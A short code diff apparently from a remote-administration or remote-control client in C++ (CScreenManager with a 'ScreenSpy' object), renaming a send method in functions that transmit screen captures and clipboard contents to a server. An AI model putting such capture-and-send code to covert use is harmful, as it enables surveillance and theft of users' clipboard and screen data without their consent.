@@ -263,7 +263,7 @@ VOID CScreenManager::SendBitMapInfo()
 	szBuffer[0] = TOKEN_BITMAPINFO;
 	//这里将bmp位图结构发送出去
 	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
-	m_ClientObject->OnServerSending((char*)szBuffer, ulLength);
+	m_ClientObject->Send2Server((char*)szBuffer, ulLength);
 	VirtualFree(szBuffer, 0, MEM_RELEASE);
 }
 
@@ -360,7 +360,7 @@ VOID CScreenManager::SendClientClipboard()
 	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
 	::GlobalUnlock(hGlobal); 
 	::CloseClipboard();
-	m_ClientObject->OnServerSending((char*)szBuffer, iPacketLength);
+	m_ClientObject->Send2Server((char*)szBuffer, iPacketLength);
 	delete[] szBuffer;
 }
 
@@ -374,7 +374,7 @@ VOID CScreenManager::SendFirstScreen()
 		return;
 	}
 
-	m_ClientObject->OnServerSending((char*)FirstScreenData, ulFirstSendLength + 1);
+	m_ClientObject->Send2Server((char*)FirstScreenData, ulFirstSendLength + 1);
 }
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
@@ -391,7 +391,7 @@ const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 
 VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
 {
-	m_ClientObject->OnServerSending(szBuffer, ulNextSendLength);
+	m_ClientObject->Send2Server(szBuffer, ulNextSendLength);
 }
 
 std::string GetTitle(HWND hWnd) {
